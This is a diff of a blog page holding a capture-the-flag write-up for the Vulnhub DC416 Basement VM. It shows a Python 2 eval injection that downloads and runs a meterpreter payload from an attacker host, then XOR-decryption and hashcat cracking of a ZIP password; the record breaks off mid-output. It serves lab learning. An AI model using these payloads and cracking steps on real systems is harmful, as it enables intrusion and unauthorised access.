@@ -1,461 +1,539 @@
-<!doctype html>
-<html lang="en" prefix="og: http://ogp.me/ns#">
-
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Vulnhub - DC416: Basement Writeup</title>
-  <meta name="description"
-    content="Vulnhub - DC416: Basement Writeup">
   
-  <meta name="keywords" content="vulnhub, walkthrough, writeup, DC416, basement">
+    <title>Vulnhub - DC416: Basement Writeup :: firefart</title>
   
-  <meta name="author" content="Christian Mehlmauer">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Vulnhub - DC416: Basement Writeup" />
+<meta name="keywords" content="vulnhub, walkthrough, writeup, DC416, basement" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://firefart.at/post/vulnhub_dc416_basement/" />
 
-  <meta name="twitter:card" content="summary">
-  
-  <meta name="twitter:site" content="@firefart" />
-  <meta name="twitter:creator" content="@firefart" />
-  
-  <meta name="twitter:title" content="Vulnhub - DC416: Basement Writeup">
-  <meta name="twitter:description"
-    content="Vulnhub - DC416: Basement Writeup">
-  <meta property="og:title" content="Vulnhub - DC416: Basement Writeup">
-  <meta property="og:type" content="article">
-  <meta property="og:url" content="https://firefart.at/post/vulnhub_dc416_basement/" />
-  <meta property="og:description"
-    content="Vulnhub - DC416: Basement Writeup">
-  
-  <meta property="og:image" content="https://firefart.at/img/misc/vulnhub.png" />
-  <meta name="twitter:image" content="https://firefart.at/img/misc/vulnhub.png" />
-  
-  <meta property="og:updated_time" content="2016-12-18 01:00:00 &#43;0100 CET" />
-  <meta property="article:author" content="https://twitter.com/firefart" />
 
-  <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700%7COxygen:400,700" rel="stylesheet"
-    type="text/css">
-  <link rel="stylesheet" href="https://yui-s.yahooapis.com/pure/0.6.0/pure-min.css">
-  <link rel="stylesheet" href="https://yui-s.yahooapis.com/pure/0.6.0/grids-responsive-min.css">
 
-  <link rel="stylesheet" href='https://firefart.at/css/all.css'>
-  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet">
+
+
 
   
   
-  <script type="application/ld+json">
-    [{
-        "@context": "http://schema.org",
-        "@type": "WebSite",
-        "name": "firefart",
-        "url": "https://firefart.at"
-      },
-      {
-        "@context": "http://schema.org",
-        "@type": "Person",
-        "name": "Christian Mehlmauer",
-        "url": "https://firefart.at",
-        "sameAs": [
-          "https://twitter.com/firefart",
-          "https://github.com/firefart",
-          "https://www.linkedin.com/in/firefart/"
-        ]
-      }
-    ]
-  </script>
+  
+  
+  
+  <link rel="stylesheet" href="/style.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://firefart.at/img/favicon.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="https://firefart.at" />
+  
+    <meta name="twitter:creator" content="firefart" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Vulnhub - DC416: Basement Writeup">
+<meta property="og:description" content="Vulnhub - DC416: Basement Writeup" />
+<meta property="og:url" content="https://firefart.at/post/vulnhub_dc416_basement/" />
+<meta property="og:site_name" content="firefart" />
+
+  
+    <meta property="og:image" content="https://firefart.at/img/favicon.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2016-12-18 01:00:00 &#43;0100 CET" />
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" src='https://firefart.at/js/firefart.js' defer></script>
+
+<script type="application/ld+json">
+  [{
+      "@context": "http://schema.org",
+      "@type": "WebSite",
+      "name": "firefart",
+      "url": "https://firefart.at"
+    },
+    {
+      "@context": "http://schema.org",
+      "@type": "Person",
+      "name": "Christian Mehlmauer",
+      "url": "https://firefart.at",
+      "sameAs": [
+        "https://twitter.com/firefart",
+        "https://github.com/firefart",
+        "https://www.linkedin.com/in/firefart/"
+      ]
+    }
+  ]
+</script>
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-N88XDVDDZ7"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-N88XDVDDZ7');
+</script>
+
+
 
 </head>
+<body class="blue">
 
-<body>
 
-<div id="layout" class="pure-g">
-    <div class="sidebar pure-u-1 pure-u-md-1-4">
-    <div class="header">
-        <h1 class="brand-title"><a href="/">firefart</a></h1>
-        <h2 class="brand-tagline"> that austrian security guy </h2>
+<div class="container center headings--one-size">
 
-        <nav class="nav">
-            <ul class="nav-list">
-                
-                <li class="nav-item">
-                    <a class="pure-button" target="_blank" href="https://twitter.com/firefart">
-                        <i class="fa fa-twitter"></i> Twitter
-                    </a>
-                </li>
-                
-                
-                <li class="nav-item">
-                    <a class="pure-button" target="_blank" href="https://github.com/firefart">
-                        <i class="fa fa-github-alt"></i> Github
-                    </a>
-                </li>
-                
-                
-                
-                <li class="nav-item">
-                    <a class="pure-button" href="/page/about/"><i class="fa fa-info"></i> about me</a>
-                </li>
-                <li class="nav-item">
-                    <a class="pure-button" target="_blank" href='https://firefart.at/index.xml'>
-                        <i class="fa fa-rss"></i> rss
-                    </a>
-                </li>
-            </ul>
-        </nav>
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    firefart | that austrian security guy
+  </div>
+</a>
+
     </div>
-</div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu hidden-on-mobile">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="https://github.com/firefart">Github</a></li>
+        
+      
+        
+          <li><a href="https://www.linkedin.com/in/firefart/">LinkedIn</a></li>
+        
+      
+        
+          <li><a href="https://twitter.com/firefart">Twitter</a></li>
+        
+      
+    
+  </ul>
+  <span class="spacer"></span>
+  <ul class="menu__inner menu__inner--desktop">
+    
+  </ul>
 
-    <div class="content pure-u-1 pure-u-md-3-4">
-        <div>
-            
-            <div class="posts">
-                <h1 class="content-subhead">18 Dec 2016, 01:00</h1>
-                <section class="post">
-                    <header class="post-header">
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="https://github.com/firefart">Github</a></li>
+      
+    
+      
+        <li><a href="https://www.linkedin.com/in/firefart/">LinkedIn</a></li>
+      
+    
+      
+        <li><a href="https://twitter.com/firefart">Twitter</a></li>
+      
+    
+    
+  </ul>
+</nav>
 
-                        <a href="/post/vulnhub_dc416_basement/" class="post-title">Vulnhub - DC416: Basement Writeup</a>
+  
+</header>
 
-                        <p class="post-meta">
-                            
-                            
-                        </p>
-                    </header>
 
-                    
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://firefart.at/post/vulnhub_dc416_basement/">Vulnhub - DC416: Basement Writeup</a>
+  </h1>
+  <div class="post-meta">
+    
+      <time class="post-date">
+        2016-12-18 ::
+        
+      </time>
+    
+    
+      <span class="post-author">Christian Mehlmauer</span>
+    
+    
+  </div>
 
-                    <div class="post-description">
-                        <p>Basement is the first of 4 VMs from the DC416 CTF by <a href="https://twitter.com/barrebas">@barrebas</a> on <a href="https://www.vulnhub.com/entry/dc416-2016,168/">Vulnhub</a>. There are 5 flags on this machine but I was only able to get 4 of them.</p>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p>Basement is the first of 4 VMs from the DC416 CTF by <a href="https://twitter.com/barrebas">@barrebas</a> on <a href="https://www.vulnhub.com/entry/dc416-2016,168/">Vulnhub</a>. There are 5 flags on this machine but I was only able to get 4 of them.</p>
 <p>Here are my other writeups for the DC416 challenges:</p>
 <ul>
 <li><a href="/post/vulnhub_dc416_baffle/">DC416 Baffle</a></li>
 <li><a href="/post/vulnhub_dc416_dick_dastardly/">DC416 Dick Dastardly</a></li>
 <li><a href="/post/vulnhub_dc416_fortress/">DC416 Fortress</a></li>
 </ul>
-<h1 id="information-gathering">information gathering</h1>
+<h2 id="information-gathering">information gathering<a href="#information-gathering" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>Before you start with a portscan you need to wait a few minutes because there are several binaries executed by cronjobs. I noticed this during exploiting the machine so be sure to start nmapping after the machine runs a few minutes.</p>
 <p>Nmap Scan:</p>
-<pre tabindex="0"><code>Starting Nmap 7.31 ( https://nmap.org ) at 2016-12-17 22:15 CET
-Nmap scan report for 192.168.56.101
-Host is up (0.00024s latency).
-Not shown: 65529 closed ports
-PORT      STATE SERVICE           VERSION
-22/tcp    open  ssh               OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
-| ssh-hostkey:
-|   1024 f4:2a:b3:db:b8:54:78:c4:8e:0e:e0:f9:15:fd:9f:3b (DSA)
-|   2048 34:b7:68:d7:0b:f8:e4:15:fe:fa:01:42:9e:ec:d1:ea (RSA)
-|_  256 c0:36:b9:27:51:54:02:4b:1f:a5:77:58:a6:9d:d4:1e (ECDSA)
-80/tcp    open  http              Apache httpd 2.4.10 ((Debian))
-|_http-server-header: Apache/2.4.10 (Debian)
-|_http-title: baffle
-8080/tcp  open  http-proxy        ------[--&gt;+++&lt;]&gt;.[-&gt;+++&lt;]&gt;.---.++++.
-|_http-server-header: ------[--&gt;+++&lt;]&gt;.[-&gt;+++&lt;]&gt;.---.++++.
-|_http-title: Site doesn&#39;t have a title (text/html).
-8090/tcp  open  unknown
-10000/tcp open  snet-sensor-mgmt?
-10001/tcp open  tcpwrapped
-
-MAC Address: 08:00:27:DF:F5:5E (Oracle VirtualBox virtual NIC)
-Device type: general purpose
-Running: Linux 3.X|4.X
-OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
-OS details: Linux 3.2 - 4.4
-Network Distance: 1 hop
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-TRACEROUTE
-HOP RTT     ADDRESS
-1   0.24 ms 192.168.56.101
-
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 110.74 seconds
-</code></pre><h1 id="jack">jack</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Starting Nmap 7.31 ( https://nmap.org ) at 2016-12-17 22:15 CET
+</span></span><span style="display:flex;"><span>Nmap scan report for 192.168.56.101
+</span></span><span style="display:flex;"><span>Host is up (0.00024s latency).
+</span></span><span style="display:flex;"><span>Not shown: 65529 closed ports
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE           VERSION
+</span></span><span style="display:flex;"><span>22/tcp    open  ssh               OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   1024 f4:2a:b3:db:b8:54:78:c4:8e:0e:e0:f9:15:fd:9f:3b (DSA)
+</span></span><span style="display:flex;"><span>|   2048 34:b7:68:d7:0b:f8:e4:15:fe:fa:01:42:9e:ec:d1:ea (RSA)
+</span></span><span style="display:flex;"><span>|_  256 c0:36:b9:27:51:54:02:4b:1f:a5:77:58:a6:9d:d4:1e (ECDSA)
+</span></span><span style="display:flex;"><span>80/tcp    open  http              Apache httpd 2.4.10 ((Debian))
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.10 (Debian)
+</span></span><span style="display:flex;"><span>|_http-title: baffle
+</span></span><span style="display:flex;"><span>8080/tcp  open  http-proxy        ------[--&gt;+++&lt;]&gt;.[-&gt;+++&lt;]&gt;.---.++++.
+</span></span><span style="display:flex;"><span>|_http-server-header: ------[--&gt;+++&lt;]&gt;.[-&gt;+++&lt;]&gt;.---.++++.
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn&#39;t have a title (text/html).
+</span></span><span style="display:flex;"><span>8090/tcp  open  unknown
+</span></span><span style="display:flex;"><span>10000/tcp open  snet-sensor-mgmt?
+</span></span><span style="display:flex;"><span>10001/tcp open  tcpwrapped
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>MAC Address: 08:00:27:DF:F5:5E (Oracle VirtualBox virtual NIC)
+</span></span><span style="display:flex;"><span>Device type: general purpose
+</span></span><span style="display:flex;"><span>Running: Linux 3.X|4.X
+</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+</span></span><span style="display:flex;"><span>OS details: Linux 3.2 - 4.4
+</span></span><span style="display:flex;"><span>Network Distance: 1 hop
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TRACEROUTE
+</span></span><span style="display:flex;"><span>HOP RTT     ADDRESS
+</span></span><span style="display:flex;"><span>1   0.24 ms 192.168.56.101
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap done: 1 IP address (1 host up) scanned in 110.74 seconds
+</span></span></code></pre></div><h2 id="jack">jack<a href="#jack" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>So let&rsquo;s start with the service on port 10000. The script asks the user to enter a number of packets to send and executes a ping:</p>
-<pre tabindex="0"><code>root@kali:~/basement# nc 192.168.56.101 10000
- Please enther number of packets: 1
-
-PING localhost (127.0.0.1) 56(84) bytes of data
-64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.053 ms
-</code></pre><p>When entering something different we can see there is a python script which takes user input through the <code>input</code> method.</p>
-<pre tabindex="0"><code>root@kali:~/basement# nc 192.168.56.101 10000
- Please enther number of packets: help
-Traceback (most recent call last):
-  File &#34;./ping.py&#34;, line 3, in &lt;module&gt;
-    num_packets = int(input(&#39; Please enther number of packets: &#39;))
-TypeError: int() argument must be a string or a number, not &#39;_Helper&#39;
-</code></pre><p>In python 2 the <code>ìnput</code> method is the same as <code>eval(raw_input())</code> so it&rsquo;s possible to evaluate python statements (In python 3 <code>input</code> behaves the same as <code>raw_input</code>).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root@kali:~/basement# nc 192.168.56.101 10000
+</span></span><span style="display:flex;"><span> Please enther number of packets: 1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PING localhost (127.0.0.1) 56(84) bytes of data
+</span></span><span style="display:flex;"><span>64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.053 ms
+</span></span></code></pre></div><p>When entering something different we can see there is a python script which takes user input through the <code>input</code> method.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root@kali:~/basement# nc 192.168.56.101 10000
+</span></span><span style="display:flex;"><span> Please enther number of packets: help
+</span></span><span style="display:flex;"><span>Traceback (most recent call last):
+</span></span><span style="display:flex;"><span>  File &#34;./ping.py&#34;, line 3, in &lt;module&gt;
+</span></span><span style="display:flex;"><span>    num_packets = int(input(&#39; Please enther number of packets: &#39;))
+</span></span><span style="display:flex;"><span>TypeError: int() argument must be a string or a number, not &#39;_Helper&#39;
+</span></span></code></pre></div><p>In python 2 the <code>ìnput</code> method is the same as <code>eval(raw_input())</code> so it&rsquo;s possible to evaluate python statements (In python 3 <code>input</code> behaves the same as <code>raw_input</code>).</p>
 <p>So by trying the payload <code>__import__('os').system('id')</code> we can see the user running this script:</p>
-<pre tabindex="0"><code>root@kali:~/basement# nc 192.168.56.101 10000
- Please enther number of packets: __import__(&#39;os&#39;).system(&#39;id&#39;)
-uid=1000(jack) gid=1000(jack) groups=1000(jack),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
-
-PING localhost (127.0.0.1) 56(84) bytes of data
-</code></pre><p>So the next step is to download a meterpreter binary and execute it with the following set of commands:</p>
-<pre tabindex="0"><code>echo &#34;__import__(&#39;os&#39;).system(&#39;wget -O /tmp/meterpreter http://192.168.56.3/meterpreter&#39;)&#34; | nc 192.168.56.101 10000
-echo &#34;__import__(&#39;os&#39;).system(&#39;chmod +x /tmp/meterpreter&#39;)&#34; | nc 192.168.56.101 10000
-echo &#34;__import__(&#39;os&#39;).system(&#39;/tmp/meterpreter &amp;&#39;)&#34; | nc 192.168.56.101 10000
-</code></pre><p>Using the meterpreter session we are able to get the first flag:</p>
-<pre tabindex="0"><code>meterpreter &gt; cat flag.txt
-flag{j4cks_t0t4L_l4cK_0f_$uRpr1sE}
-</code></pre><h1 id="marla-1">marla #1</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root@kali:~/basement# nc 192.168.56.101 10000
+</span></span><span style="display:flex;"><span> Please enther number of packets: __import__(&#39;os&#39;).system(&#39;id&#39;)
+</span></span><span style="display:flex;"><span>uid=1000(jack) gid=1000(jack) groups=1000(jack),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PING localhost (127.0.0.1) 56(84) bytes of data
+</span></span></code></pre></div><p>So the next step is to download a meterpreter binary and execute it with the following set of commands:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>echo &#34;__import__(&#39;os&#39;).system(&#39;wget -O /tmp/meterpreter http://192.168.56.3/meterpreter&#39;)&#34; | nc 192.168.56.101 10000
+</span></span><span style="display:flex;"><span>echo &#34;__import__(&#39;os&#39;).system(&#39;chmod +x /tmp/meterpreter&#39;)&#34; | nc 192.168.56.101 10000
+</span></span><span style="display:flex;"><span>echo &#34;__import__(&#39;os&#39;).system(&#39;/tmp/meterpreter &amp;&#39;)&#34; | nc 192.168.56.101 10000
+</span></span></code></pre></div><p>Using the meterpreter session we are able to get the first flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>meterpreter &gt; cat flag.txt
+</span></span><span style="display:flex;"><span>flag{j4cks_t0t4L_l4cK_0f_$uRpr1sE}
+</span></span></code></pre></div><h2 id="marla-1">marla #1<a href="#marla-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>By looking at <code>/etc/passwd</code> we can see there are 4 seperate users on the system so probably each user holds one flag.</p>
-<pre tabindex="0"><code>jack:x:1000:1000:jack,,,:/home/jack:/bin/bash
-marla:x:1001:1001:marla,,,:/home/marla:/bin/marla
-tyler:x:1002:1002:tyler,,,:/home/tyler:/bin/tyler
-robert:x:1003:1003:robert,,,:/home/robert:/bin/bash
-</code></pre><p>In the folder <code>/home/jack/.secret/</code> there is a file called <code>marla.xip</code>. A file command on the file reveals only <code>data</code> so we have to dig deeper.</p>
-<pre tabindex="0"><code>root@kali:~# file marla.xip
-marla.xip: data
-</code></pre><p>barrebas got me the hint that this <code>xip</code> extension is a mix of two filetypes. So the file is probably a XOR encrypted ZIP archive. To quickly test XOR keys I used <a href="https://github.com/hellman/xortool.git">xortool</a>.</p>
-<pre tabindex="0"><code>root@kali:~/xortool# xortool -b /root/marla.xip
-The most probable key lengths:
-   3:   14.6%
-   6:   19.6%
-   9:   11.0%
-  12:   13.8%
-  15:   7.4%
-  18:   10.1%
-  21:   5.6%
-  24:   7.1%
-  27:   5.1%
-  30:   5.6%
-Key-length can be 3*n
-256 possible key(s) of length 6:
-M4YH3M
-L5XI2L
-O6[J1O
-N7ZK0N
-I0]L7I
-...
-Found 0 plaintexts with 95.0%+ printable characters
-See files filename-key.csv, filename-char_used-perc_printable.csv
-</code></pre><p>Now let&rsquo;s look at the directory with the decoded files and see if we can spot something of interest:</p>
-<pre tabindex="0"><code>root@kali:~/xortool/xortool_out# file * | grep -v &#34;     data&#34;
-000.out:                               Zip archive data
-197.out:                               PGP\011Secret Key -
-199.out:                               PGP\011Secret Sub-key -
-220.out:                               DOS executable (COM, 0x8C-variant)
-232.out:                               COM executable for DOS
-252.out:                               AIX core file fulldump
-filename-char_used-perc_printable.csv: ASCII text
-filename-key.csv:                      ASCII text
-</code></pre><p>So we have found a ZIP archive. By looking at the generated csv we can see the XOR key beeing used was <code>M4YH3M</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>jack:x:1000:1000:jack,,,:/home/jack:/bin/bash
+</span></span><span style="display:flex;"><span>marla:x:1001:1001:marla,,,:/home/marla:/bin/marla
+</span></span><span style="display:flex;"><span>tyler:x:1002:1002:tyler,,,:/home/tyler:/bin/tyler
+</span></span><span style="display:flex;"><span>robert:x:1003:1003:robert,,,:/home/robert:/bin/bash
+</span></span></code></pre></div><p>In the folder <code>/home/jack/.secret/</code> there is a file called <code>marla.xip</code>. A file command on the file reveals only <code>data</code> so we have to dig deeper.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root@kali:~# file marla.xip
+</span></span><span style="display:flex;"><span>marla.xip: data
+</span></span></code></pre></div><p>barrebas got me the hint that this <code>xip</code> extension is a mix of two filetypes. So the file is probably a XOR encrypted ZIP archive. To quickly test XOR keys I used <a href="https://github.com/hellman/xortool.git">xortool</a>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root@kali:~/xortool# xortool -b /root/marla.xip
+</span></span><span style="display:flex;"><span>The most probable key lengths:
+</span></span><span style="display:flex;"><span>   3:   14.6%
+</span></span><span style="display:flex;"><span>   6:   19.6%
+</span></span><span style="display:flex;"><span>   9:   11.0%
+</span></span><span style="display:flex;"><span>  12:   13.8%
+</span></span><span style="display:flex;"><span>  15:   7.4%
+</span></span><span style="display:flex;"><span>  18:   10.1%
+</span></span><span style="display:flex;"><span>  21:   5.6%
+</span></span><span style="display:flex;"><span>  24:   7.1%
+</span></span><span style="display:flex;"><span>  27:   5.1%
+</span></span><span style="display:flex;"><span>  30:   5.6%
+</span></span><span style="display:flex;"><span>Key-length can be 3*n
+</span></span><span style="display:flex;"><span>256 possible key(s) of length 6:
+</span></span><span style="display:flex;"><span>M4YH3M
+</span></span><span style="display:flex;"><span>L5XI2L
+</span></span><span style="display:flex;"><span>O6[J1O
+</span></span><span style="display:flex;"><span>N7ZK0N
+</span></span><span style="display:flex;"><span>I0]L7I
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Found 0 plaintexts with 95.0%+ printable characters
+</span></span><span style="display:flex;"><span>See files filename-key.csv, filename-char_used-perc_printable.csv
+</span></span></code></pre></div><p>Now let&rsquo;s look at the directory with the decoded files and see if we can spot something of interest:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root@kali:~/xortool/xortool_out# file * | grep -v &#34;     data&#34;
+</span></span><span style="display:flex;"><span>000.out:                               Zip archive data
+</span></span><span style="display:flex;"><span>197.out:                               PGP\011Secret Key -
+</span></span><span style="display:flex;"><span>199.out:                               PGP\011Secret Sub-key -
+</span></span><span style="display:flex;"><span>220.out:                               DOS executable (COM, 0x8C-variant)
+</span></span><span style="display:flex;"><span>232.out:                               COM executable for DOS
+</span></span><span style="display:flex;"><span>252.out:                               AIX core file fulldump
+</span></span><span style="display:flex;"><span>filename-char_used-perc_printable.csv: ASCII text
+</span></span><span style="display:flex;"><span>filename-key.csv:                      ASCII text
+</span></span></code></pre></div><p>So we have found a ZIP archive. By looking at the generated csv we can see the XOR key beeing used was <code>M4YH3M</code>.</p>
 <p>Next step is to examine the contents of the zip file.</p>
-<pre tabindex="0"><code>root@kali:~# mv 000.out /root/marla.zip
-root@kali:~# unzip -l marla.zip
-Archive:  marla.zip
-  Length      Date    Time    Name
----------  ---------- -----   ----
-     1766  2016-11-22 04:41   marla
-      396  2016-11-22 04:49   marla.pub
----------                     -------
-     2162                     2 files
-</code></pre><p>Unfortunately the zip file is encrypted with a password so let&rsquo;s try to crack it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root@kali:~# mv 000.out /root/marla.zip
+</span></span><span style="display:flex;"><span>root@kali:~# unzip -l marla.zip
+</span></span><span style="display:flex;"><span>Archive:  marla.zip
+</span></span><span style="display:flex;"><span>  Length      Date    Time    Name
+</span></span><span style="display:flex;"><span>---------  ---------- -----   ----
+</span></span><span style="display:flex;"><span>     1766  2016-11-22 04:41   marla
+</span></span><span style="display:flex;"><span>      396  2016-11-22 04:49   marla.pub
+</span></span><span style="display:flex;"><span>---------                     -------
+</span></span><span style="display:flex;"><span>     2162                     2 files
+</span></span></code></pre></div><p>Unfortunately the zip file is encrypted with a password so let&rsquo;s try to crack it.</p>
 <p>JohnTheRipper contains a handy little script called <code>zip2john</code> to extract the password hash for cracking. I then removed all except the hash from the file and ran hashcat against it.</p>
-<pre tabindex="0"><code>[firefart@linux hashcat]$ /home/firefart/hacking/JohnTheRipper/run/zip2john /home/firefart/marla.zip
-marla.zip:$zip2$*0*1*0*05ed2b46cc5c8fdd*4dfb*14c*3c099c875a5b4e660f310f657f34d7023b638556bc90a38168d5d752454a8954ebe2a08e064153f36afa0eb398f11139fae94e5cb7678dbda653de495847cd9e2c8c03573f6260f349a6e553b3a21647bcb351ae01ef15538cd613b97a144ad97d2f0db50bd29e093ea7772db8e465c5e6019f4427eab1f059241f86091148e8e292171a7cebb85fa07826f8b2061414931b217e63aa187ee508bad16cb1c57993bd703096b77e4e376edd9842e4363e58512b26422cbf1961a4ad741d4ab9d292a447cd6eaccd23e040702edb8be854798a35a63491b07b4c3b820e6c2a394e42a17180720cd9287f953f3482382068df0a98755ee27ba9ee0667b5b813cc3c9105a92d9f76566e9674d0c8ccc4050abeda5089d854546a5a39da8d93da503179dc6e0d847d29ede19654471d5a875e65a81e700810b4b7f1657bf8d78869e8078681dabfc35d0e0bc15fee*321fdfa476052bcf20c6*$/zip2$:::::marla.zip
-
-[firefart@linux hashcat]$ cat /home/firefart/marla.zip.hash
-$zip2$*0*1*0*05ed2b46cc5c8fdd*4dfb*14c*3c099c875a5b4e660f310f657f34d7023b638556bc90a38168d5d752454a8954ebe2a08e064153f36afa0eb398f11139fae94e5cb7678dbda653de495847cd9e2c8c03573f6260f349a6e553b3a21647bcb351ae01ef15538cd613b97a144ad97d2f0db50bd29e093ea7772db8e465c5e6019f4427eab1f059241f86091148e8e292171a7cebb85fa07826f8b2061414931b217e63aa187ee508bad16cb1c57993bd703096b77e4e376edd9842e4363e58512b26422cbf1961a4ad741d4ab9d292a447cd6eaccd23e040702edb8be854798a35a63491b07b4c3b820e6c2a394e42a17180720cd9287f953f3482382068df0a98755ee27ba9ee0667b5b813cc3c9105a92d9f76566e9674d0c8ccc4050abeda5089d854546a5a39da8d93da503179dc6e0d847d29ede19654471d5a875e65a81e700810b4b7f1657bf8d78869e8078681dabfc35d0e0bc15fee*321fdfa476052bcf20c6*$/zip2$
-
-[firefart@linux hashcat]$ ./hashcat -a 3 -m 13600 /home/firefart/marla.zip.hash
-
-$zip2$*0*1*0*05ed2b46cc5c8fdd*4dfb*14*3c099c875a5b4e660f310f657f34d7023b638556bc90a38168d5d752454a8954ebe2a08e064153f36afa0eb398f11139fae94e5cb7678dbda653de495847cd9e2c8c03573f6260f349a6e553b3a21647bcb351ae01ef15538cd613b97a144ad97d2f0db50bd29e093ea7772db8e465c5e6019f4427eab1f059241f86091148e8e292171a7cebb85fa07826f8b2061414931b217e63aa187ee508bad16cb1c57993bd703096b77e4e376edd9842e4363e58512b26422cbf1961a4ad741d4ab9d292a447cd6eaccd23e040702edb8be854798a35a63491b07b4c3b820e6c2a394e42a17180720cd9287f953f3482382068df0a98755ee27ba9ee0667b5b813cc3c9105a92d9f76566e9674d0c8ccc4050abeda5089d854546a5a39da8d93da503179dc6e0d847d29ede19654471d5a875e65a81e700810b4b7f1657bf8d78869e8078681dabfc35d0e0bc15fee*321fdfa476052bcf20c6*$/zip2$:m4rl4
-
-Session..........: hashcat
-Status...........: Cracked
-Hash.Type........: WinZip
